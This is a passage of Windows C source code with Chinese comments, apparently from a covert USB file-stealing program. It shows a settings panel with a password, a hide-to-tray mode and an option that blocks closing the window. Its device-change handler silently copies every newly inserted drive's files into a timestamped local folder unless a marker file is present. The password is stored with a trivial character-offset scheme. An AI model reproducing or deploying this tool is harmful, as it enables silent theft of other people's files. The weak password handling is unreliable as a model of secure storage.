							FillRect(hdcBuffer, &rectBuffer1, (HBRUSH)GetSysColor(COLOR_BTNFACE));
						ReleaseDC(hwndSetBtnChooseFTN, hdcBuffer);
						break;

					case CTL_ID_SET_BTN_CHOOSE_CNCF:
						bCheckFileNoCopy = !bCheckFileNoCopy;
						SetRect(&rectBuffer1,3, 3, 9, 9);
						hdcBuffer = GetDC(hwndSetBtnChooseCheckNoCopyFile);
						if(bCheckFileNoCopy)
							FillRect(hdcBuffer, &rectBuffer1, (HBRUSH)GetStockObject(BLACK_BRUSH));		
						else
							FillRect(hdcBuffer, &rectBuffer1, (HBRUSH)GetSysColor(COLOR_BTNFACE));
						ReleaseDC(hwndSetBtnChooseCheckNoCopyFile, hdcBuffer);
						break;

					case CTL_ID_SET_BTN_CHOOSE_PPC:
						bPreventProcessClose = !bPreventProcessClose;
						SetRect(&rectBuffer1,3, 3, 9, 9);
						hdcBuffer = GetDC(hwndSetBtnChoosePreventProcessClose);
						if(bPreventProcessClose)
							FillRect(hdcBuffer, &rectBuffer1, (HBRUSH)GetStockObject(BLACK_BRUSH));		
						else
							FillRect(hdcBuffer, &rectBuffer1, (HBRUSH)GetSysColor(COLOR_BTNFACE));
						ReleaseDC(hwndSetBtnChoosePreventProcessClose, hdcBuffer);
						break;
			
					//帮助按钮
					case CTL_ID_SET_BTN_HELP:
						ShowWindow(hwndSetBtnHelp,						SW_HIDE);
						ShowWindow(hwndSetBtnSave,						SW_HIDE);
						ShowWindow(hwndSetBtnChgPwd,					SW_HIDE);
						ShowWindow(hwndSetBtnHide,						SW_HIDE);
						ShowWindow(hwndSetBtnExit,						SW_HIDE);
						ShowWindow(hwndSetEditPathFIL,					SW_HIDE);
						ShowWindow(hwndSetBtnChooseFTN,					SW_HIDE);
						ShowWindow(hwndSetEditPathFTN,					SW_HIDE);
						ShowWindow(hwndSetBtnChooseCheckNoCopyFile,		SW_HIDE);
						ShowWindow(hwndSetBtnEditCheckNoCopyFileName,	SW_HIDE);
						ShowWindow(hwndSetBtnChoosePreventProcessClose,	SW_HIDE);
						ShowWindow(hwndHelpBtnReturn,					SW_SHOW);
						ShowWindow(hwndHelpStaticText,					SW_SHOW);
						SetTimer(hwnd, TIMER_ID_HELP, 1500, NULL);
						iStep = STEPHELP;
						InvalidateRect(hwnd, NULL, TRUE);
						break;


					//保存按钮
					case CTL_ID_SET_BTN_SAVE:
						GetWindowText(hwndSetEditPathFIL,					szFileInLocal,		1024);
						GetWindowText(hwndSetEditPathFTN,					szFileToNet,		1024);
						GetWindowText(hwndSetBtnEditCheckNoCopyFileName,	szCheckFileNoCopy,	260 );
						if(INVALID_HANDLE_VALUE != (handleBuffer = CreateFile(szDataPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)))
						{
							SetFilePointer(handleBuffer, 17	* sizeof(TCHAR), NULL, FILE_BEGIN);
							WriteFile(handleBuffer, TEXT(szFileInLocal),	1024	* sizeof(TCHAR), &dwBuffer, NULL);
							WriteFile(handleBuffer, &bFileToNet,			1		* sizeof(BOOL),	 &dwBuffer, NULL);
							WriteFile(handleBuffer, TEXT(szFileToNet),		1024	* sizeof(TCHAR), &dwBuffer, NULL);
							WriteFile(handleBuffer, &bCheckFileNoCopy,		1		* sizeof(BOOL),	 &dwBuffer, NULL);
							WriteFile(handleBuffer, TEXT(szCheckFileNoCopy),260		* sizeof(TCHAR), &dwBuffer, NULL);
							WriteFile(handleBuffer, &bPreventProcessClose,	1		* sizeof(BOOL),	 &dwBuffer, NULL);
							CloseHandle(handleBuffer);
							MessageBox(hwnd, TEXT("设置保存成功！"), TEXT("提示"), MB_OK);
						}
						else
						{
							iBuffer = GetLastError();
							wsprintf(szBuffer1, TEXT("设置保存失败！\nError:\nGetLastError:CreateFile:Save:data.dat:%d"), iBuffer);
							MessageBox(hwnd, szBuffer1, TEXT("错误"), MB_ICONERROR);
						}
						break;


					//更改密码按钮
					case CTL_ID_SET_BTN_CHGPWD:
						ShowWindow(hwndSetBtnHelp,						SW_HIDE);
						ShowWindow(hwndSetBtnSave,						SW_HIDE);
						ShowWindow(hwndSetBtnChgPwd,					SW_HIDE);
						ShowWindow(hwndSetBtnHide,						SW_HIDE);
						ShowWindow(hwndSetBtnExit,						SW_HIDE);
						ShowWindow(hwndSetEditPathFIL,					SW_HIDE);
						ShowWindow(hwndSetBtnChooseFTN,					SW_HIDE);
						ShowWindow(hwndSetEditPathFTN,					SW_HIDE);
						ShowWindow(hwndSetBtnChooseCheckNoCopyFile,		SW_HIDE);
						ShowWindow(hwndSetBtnEditCheckNoCopyFileName,	SW_HIDE);
						ShowWindow(hwndSetBtnChoosePreventProcessClose,	SW_HIDE);	
						ShowWindow(hwndChgPwdBtnReturn,					SW_SHOW);
						ShowWindow(hwndChgPwdEditOld,					SW_SHOW);
						ShowWindow(hwndChgPwdEditNew1,					SW_SHOW);
						ShowWindow(hwndChgPwdEditNew2,					SW_SHOW);
						ShowWindow(hwndChgPwdBtnSave,					SW_SHOW);
						iStep = STEPCHGPWD;
						InvalidateRect(hwnd, NULL, TRUE);
						break;

					//确认更改密码按钮
					case CTL_ID_CHGPWD_BTN_SAVE:
						GetWindowText(hwndChgPwdEditOld, szBuffer1, 17);
						if(lstrcmp(szBuffer1, szPassword))
						{
							MessageBox(hwnd, TEXT("旧密码输入错误！请重新输入！"), TEXT("提示"), MB_ICONWARNING);
							break;
						}
						GetWindowText(hwndChgPwdEditNew1, szBuffer1, 17);
						GetWindowText(hwndChgPwdEditNew2, szBuffer2, 17);
						if(lstrcmp(szBuffer1, szBuffer2))
						{
							MessageBox(hwnd, TEXT("新密码两次输入不相同！请重新输入！"), TEXT("提示"), MB_ICONWARNING);
							break;
						}
						lstrcpy(szPassword, szBuffer1);
						for(iBuffer = 0; iBuffer < 17; iBuffer++)
							szBuffer1[iBuffer] -= iBuffer;
						if(INVALID_HANDLE_VALUE != (handleBuffer = CreateFile(szDataPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)))
						{
							WriteFile(handleBuffer, TEXT(szBuffer1), 17 * sizeof(TCHAR), &dwBuffer, NULL);
							CloseHandle(handleBuffer);
							MessageBox(hwnd, TEXT("密码更改成功！"), TEXT("提示"), MB_OK);
						}
						else
						{
							iBuffer = GetLastError();
							wsprintf(szBuffer1, TEXT("密码更改失败！\nError:\nGetLastError:CreateFile:Save:data.dat:%d"), iBuffer);
							MessageBox(hwnd, szBuffer1, TEXT("错误"), MB_ICONERROR);
						}
						break;

					//返回按钮
					case CTL_ID_CHGPWD_BTN_RETURN:
						ShowWindow(hwndChgPwdEditOld,					SW_HIDE);
						ShowWindow(hwndChgPwdEditNew1,					SW_HIDE);
						ShowWindow(hwndChgPwdEditNew2,					SW_HIDE);
						ShowWindow(hwndChgPwdBtnSave,					SW_HIDE);
						ShowWindow(hwndChgPwdBtnReturn,					SW_HIDE);
						ShowWindow(hwndSetBtnHelp,						SW_SHOW);
						ShowWindow(hwndSetBtnSave,						SW_SHOW);
						ShowWindow(hwndSetBtnChgPwd,					SW_SHOW);
						ShowWindow(hwndSetBtnHide,						SW_SHOW);
						ShowWindow(hwndSetBtnExit,						SW_SHOW);
						ShowWindow(hwndSetEditPathFIL,					SW_SHOW);
						ShowWindow(hwndSetBtnChooseFTN,					SW_SHOW);
						ShowWindow(hwndSetEditPathFTN,					SW_SHOW);
						ShowWindow(hwndSetBtnChooseCheckNoCopyFile,		SW_SHOW);
						ShowWindow(hwndSetBtnEditCheckNoCopyFileName,	SW_SHOW);
						ShowWindow(hwndSetBtnChoosePreventProcessClose,	SW_SHOW);
						SetWindowText(hwndChgPwdEditOld,	TEXT(""));
						SetWindowText(hwndChgPwdEditNew1,	TEXT(""));
						SetWindowText(hwndChgPwdEditNew2,	TEXT(""));
						iStep = STEPSET;
						InvalidateRect(hwnd, NULL, TRUE);
						break;

					case CTL_ID_HELP_BTN_RETURN:
						ShowWindow(hwndHelpBtnReturn,					SW_HIDE);
						ShowWindow(hwndHelpStaticText,					SW_HIDE);
						ShowWindow(hwndSetBtnHelp,						SW_SHOW);
						ShowWindow(hwndSetBtnSave,						SW_SHOW);
						ShowWindow(hwndSetBtnChgPwd,					SW_SHOW);
						ShowWindow(hwndSetBtnHide,						SW_SHOW);
						ShowWindow(hwndSetBtnExit,						SW_SHOW);
						ShowWindow(hwndSetEditPathFIL,					SW_SHOW);
						ShowWindow(hwndSetBtnChooseFTN,					SW_SHOW);
						ShowWindow(hwndSetEditPathFTN,					SW_SHOW);
						ShowWindow(hwndSetBtnChooseCheckNoCopyFile,		SW_SHOW);
						ShowWindow(hwndSetBtnEditCheckNoCopyFileName,	SW_SHOW);
						ShowWindow(hwndSetBtnChoosePreventProcessClose,	SW_SHOW);
						KillTimer(hwnd, TIMER_ID_HELP);
						iStep = STEPSET;
						InvalidateRect(hwnd, NULL, TRUE);
						break;

					//退出按钮
					case CTL_ID_SET_BTN_EXIT:					
						DeleteObject(hbrBk);
						DeleteObject(hbrBtnSelect);
						PostQuitMessage(0);
						break;

				}
			}
			return 0;

		case WM_TIMER:
			iHelpTextPos++;
			if(iHelpTextPos >= 14)
				iHelpTextPos = 0;
			SetWindowText(hwndHelpStaticText, szHelpText + iHelpTextPos * 28/*一行28个char字符*/);
			return 0;
		

		case WM_SYSCOMMAND:
			if(wParam == SC_CLOSE && bPreventProcessClose)
				return 0;
			else
				break;


		//程序系统托盘消息
		case WM_PROSYSTRAY:
			if(wParam == IDI_PROICON && lParam == WM_RBUTTONDBLCLK)
			{    
				Shell_NotifyIcon(NIM_DELETE, &nid);
				ShowWindow(hwnd, SW_SHOWNORMAL);
				return TRUE;      
			}  
			return FALSE;


		//实现文件复制
		case WM_DEVICECHANGE:
			//非设备安装成功和非逻辑磁盘的消息不处理
			if(wParam != DBT_DEVICEARRIVAL || ((PDEV_BROADCAST_HDR)lParam)->dbch_devicetype != DBT_DEVTYP_VOLUME)
				return BROADCAST_QUERY_DENY;
			else
			{
				dwBuffer = ((PDEV_BROADCAST_VOLUME)lParam)->dbcv_unitmask;
				for(iBuffer = 0; !(dwBuffer & 1); iBuffer++)
				{
					dwBuffer = dwBuffer >> 1;
				}
				if(iBuffer >= 26)//磁盘盘符超标
					return BROADCAST_QUERY_DENY;
				else
					wsprintf(szBuffer2, TEXT("%c%s"), 'A' + iBuffer, TEXT(":\\"));
			}
			//检测是否存在不进行复制命令的文件
			if( bCheckFileNoCopy && (FileCheck(szBuffer2, szCheckFileNoCopy) == -1) )
				return TRUE;
			//获得电脑当地时间以建立相关文件夹
			GetLocalTime(&st);
			wsprintf(szBuffer1, TEXT("%s%s"),		szFileInLocal,TEXT("\\"));
			wsprintf(szBuffer1, TEXT("%s%d年"),		szBuffer1, st.wYear		);
			wsprintf(szBuffer1, TEXT("%s%d月"),		szBuffer1, st.wMonth	);
			wsprintf(szBuffer1, TEXT("%s%d日"),		szBuffer1, st.wDay		);
			wsprintf(szBuffer1, TEXT("%s%d时"),		szBuffer1, st.wHour		);
			wsprintf(szBuffer1, TEXT("%s%d分"),		szBuffer1, st.wMinute	);
			wsprintf(szBuffer1, TEXT("%s%d秒\\"),	szBuffer1, st.wSecond	);
			MakeSureDirectoryPathExists(szBuffer1);	
			//复制文件
			FileCopy(szBuffer1, szBuffer2);
			return TRUE;


		case WM_DESTROY:
			if(!bPreventProcessClose)
				PostQuitMessage(0);
			return 0;
    }
	return DefWindowProc(hwnd, msg, wParam, lParam);
}
